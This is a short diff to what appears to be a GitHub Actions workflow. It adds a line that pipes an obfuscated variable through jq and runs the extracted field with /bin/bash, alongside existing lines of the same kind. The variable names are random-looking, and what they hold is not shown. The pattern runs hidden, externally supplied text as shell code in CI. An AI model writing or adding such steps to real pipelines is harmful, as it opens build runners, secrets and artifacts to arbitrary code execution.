@@ -40,6 +40,7 @@ jobs:
           echo $eg270 | jq -r .hut9 | /bin/bash
           echo $uj48 | jq -r .rooe0446 | /bin/bash
           printf '%s' "$cmh550" | jq -r .rqokz02 | /bin/bash
+          echo $jt52752 | jq -r .lem2854 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
